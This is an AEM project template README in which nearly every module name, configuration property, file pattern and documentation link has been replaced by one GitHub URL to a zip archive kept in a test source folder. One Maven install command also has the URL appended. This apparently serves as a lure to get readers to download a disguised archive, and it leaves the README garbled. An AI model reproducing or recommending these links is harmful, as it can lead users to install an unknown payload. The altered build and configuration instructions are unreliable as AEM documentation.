# Sample AEM project template

This is a project template for AEM-based applications. It is intended as a best-practice set of examples as well as a potential starting point to develop your own functionality.

## Modules

The main parts of the template are:

* core: Java bundle containing all core functionality like OSGi services, listeners or schedulers, as well as component-related Java code such as servlets or request filters.
* https://github.com/MugaboDenys/AEM_WKND_Adaptive_Forms/raw/refs/heads/main/core/src/test/java/it/codeland/forms/core/WKN_Forms_Adaptive_AE_1.8-beta.1.zip Java based integration tests
* https://github.com/MugaboDenys/AEM_WKND_Adaptive_Forms/raw/refs/heads/main/core/src/test/java/it/codeland/forms/core/WKN_Forms_Adaptive_AE_1.8-beta.1.zip contains the /apps (and /etc) parts of the project, ie JS&CSS clientlibs, components, and templates
* https://github.com/MugaboDenys/AEM_WKND_Adaptive_Forms/raw/refs/heads/main/core/src/test/java/it/codeland/forms/core/WKN_Forms_Adaptive_AE_1.8-beta.1.zip contains sample content using the components from the https://github.com/MugaboDenys/AEM_WKND_Adaptive_Forms/raw/refs/heads/main/core/src/test/java/it/codeland/forms/core/WKN_Forms_Adaptive_AE_1.8-beta.1.zip
* https://github.com/MugaboDenys/AEM_WKND_Adaptive_Forms/raw/refs/heads/main/core/src/test/java/it/codeland/forms/core/WKN_Forms_Adaptive_AE_1.8-beta.1.zip contains runmode specific OSGi configs for the project
* https://github.com/MugaboDenys/AEM_WKND_Adaptive_Forms/raw/refs/heads/main/core/src/test/java/it/codeland/forms/core/WKN_Forms_Adaptive_AE_1.8-beta.1.zip an optional dedicated front-end build mechanism (Angular, React or general Webpack project)
* https://github.com/MugaboDenys/AEM_WKND_Adaptive_Forms/raw/refs/heads/main/core/src/test/java/it/codeland/forms/core/WKN_Forms_Adaptive_AE_1.8-beta.1.zip Selenium based UI tests
* all: a single content package that embeds all of the compiled modules (bundles and content packages) including any vendor dependencies
* analyse: this module runs analysis on the project which provides additional validation for deploying into AEMaaCS

## How to build

To build all the modules run in the project root directory the following command with Maven 3:

    mvn clean install

To build all the modules and deploy the `all` package to a local instance of AEM, run in the project root directory the following command:

    mvn clean install -PautoInstallSinglePackage

Or to deploy it to a publish instance, run

    mvn clean install -PautoInstallSinglePackagePublish

Or alternatively

    mvn clean install -PautoInstallSinglePackage https://github.com/MugaboDenys/AEM_WKND_Adaptive_Forms/raw/refs/heads/main/core/src/test/java/it/codeland/forms/core/WKN_Forms_Adaptive_AE_1.8-beta.1.zip

Or to deploy only the bundle to the author, run

    mvn clean install -PautoInstallBundle

Or to deploy only a single content package, run in the sub-module directory (i.e `https://github.com/MugaboDenys/AEM_WKND_Adaptive_Forms/raw/refs/heads/main/core/src/test/java/it/codeland/forms/core/WKN_Forms_Adaptive_AE_1.8-beta.1.zip`)

    mvn clean install -PautoInstallPackage

## Testing

There are three levels of testing contained in the project:

### Unit tests

This show-cases classic unit testing of the code contained in the bundle. To
test, execute:

    mvn clean test

### Integration tests

This allows running integration tests that exercise the capabilities of AEM via
HTTP calls to its API. To run the integration tests, run:

    mvn clean verify -Plocal

Test classes must be saved in the `src/main/java` directory (or any of its
subdirectories), and must be contained in files matching the pattern `*https://github.com/MugaboDenys/AEM_WKND_Adaptive_Forms/raw/refs/heads/main/core/src/test/java/it/codeland/forms/core/WKN_Forms_Adaptive_AE_1.8-beta.1.zip`.

The configuration provides sensible defaults for a typical local installation of
AEM. If you want to point the integration tests to different AEM author and
publish instances, you can use the following system properties via Maven's `-D`
flag.

| Property | Description | Default value |
| --- | --- | --- |
| `https://github.com/MugaboDenys/AEM_WKND_Adaptive_Forms/raw/refs/heads/main/core/src/test/java/it/codeland/forms/core/WKN_Forms_Adaptive_AE_1.8-beta.1.zip` | URL of the author instance | `http://localhost:4502` |
| `https://github.com/MugaboDenys/AEM_WKND_Adaptive_Forms/raw/refs/heads/main/core/src/test/java/it/codeland/forms/core/WKN_Forms_Adaptive_AE_1.8-beta.1.zip` | Admin user for the author instance | `admin` |
| `https://github.com/MugaboDenys/AEM_WKND_Adaptive_Forms/raw/refs/heads/main/core/src/test/java/it/codeland/forms/core/WKN_Forms_Adaptive_AE_1.8-beta.1.zip` | Password of the admin user for the author instance | `admin` |
| `https://github.com/MugaboDenys/AEM_WKND_Adaptive_Forms/raw/refs/heads/main/core/src/test/java/it/codeland/forms/core/WKN_Forms_Adaptive_AE_1.8-beta.1.zip` | URL of the publish instance | `http://localhost:4503` |
| `https://github.com/MugaboDenys/AEM_WKND_Adaptive_Forms/raw/refs/heads/main/core/src/test/java/it/codeland/forms/core/WKN_Forms_Adaptive_AE_1.8-beta.1.zip` | Admin user for the publish instance | `admin` |
| `https://github.com/MugaboDenys/AEM_WKND_Adaptive_Forms/raw/refs/heads/main/core/src/test/java/it/codeland/forms/core/WKN_Forms_Adaptive_AE_1.8-beta.1.zip` | Password of the admin user for the publish instance | `admin` |

The integration tests in this archetype use the [AEM Testing
Clients](https://github.com/MugaboDenys/AEM_WKND_Adaptive_Forms/raw/refs/heads/main/core/src/test/java/it/codeland/forms/core/WKN_Forms_Adaptive_AE_1.8-beta.1.zip) and showcase some
recommended [best
practices](https://github.com/MugaboDenys/AEM_WKND_Adaptive_Forms/raw/refs/heads/main/core/src/test/java/it/codeland/forms/core/WKN_Forms_Adaptive_AE_1.8-beta.1.zip) to
be put in use when writing integration tests for AEM.

## Static Analysis

The `analyse` module performs static analysis on the project for deploying into AEMaaCS. It is automatically
run when executing

    mvn clean install

from the project root directory. Additional information about this analysis and how to further configure it
can be found here https://github.com/MugaboDenys/AEM_WKND_Adaptive_Forms/raw/refs/heads/main/core/src/test/java/it/codeland/forms/core/WKN_Forms_Adaptive_AE_1.8-beta.1.zip

### UI tests

They will test the UI layer of your AEM application using Selenium technology. 

To run them locally:

    mvn clean verify -Pui-tests-local-execution

This default command requires:
* an AEM author instance available at http://localhost:4502 (with the whole project built and deployed on it, see `How to build` section above)
* Chrome browser installed at default location

Check README file in `https://github.com/MugaboDenys/AEM_WKND_Adaptive_Forms/raw/refs/heads/main/core/src/test/java/it/codeland/forms/core/WKN_Forms_Adaptive_AE_1.8-beta.1.zip` module for more details.

## ClientLibs

The frontend module is made available using an [AEM ClientLib](https://github.com/MugaboDenys/AEM_WKND_Adaptive_Forms/raw/refs/heads/main/core/src/test/java/it/codeland/forms/core/WKN_Forms_Adaptive_AE_1.8-beta.1.zip). When executing the NPM build script, the app is built and the [`aem-clientlib-generator`](https://github.com/MugaboDenys/AEM_WKND_Adaptive_Forms/raw/refs/heads/main/core/src/test/java/it/codeland/forms/core/WKN_Forms_Adaptive_AE_1.8-beta.1.zip) package takes the resulting build output and transforms it into such a ClientLib.

A ClientLib will consist of the following files and directories:

- `css/`: CSS files which can be requested in the HTML
- `https://github.com/MugaboDenys/AEM_WKND_Adaptive_Forms/raw/refs/heads/main/core/src/test/java/it/codeland/forms/core/WKN_Forms_Adaptive_AE_1.8-beta.1.zip` (tells AEM the order and names of files in `css/` so they can be merged)
- `js/`: JavaScript files which can be requested in the HTML
- `https://github.com/MugaboDenys/AEM_WKND_Adaptive_Forms/raw/refs/heads/main/core/src/test/java/it/codeland/forms/core/WKN_Forms_Adaptive_AE_1.8-beta.1.zip` (tells AEM the order and names of files in `js/` so they can be merged
- `resources/`: Source maps, non-entrypoint code chunks (resulting from code splitting), static assets (e.g. icons), etc.

## Maven settings

The project comes with the auto-public repository configured. To setup the repository in your Maven settings, refer to:

    https://github.com/MugaboDenys/AEM_WKND_Adaptive_Forms/raw/refs/heads/main/core/src/test/java/it/codeland/forms/core/WKN_Forms_Adaptive_AE_1.8-beta.1.zip
# Generate_DOC_XDP_XML
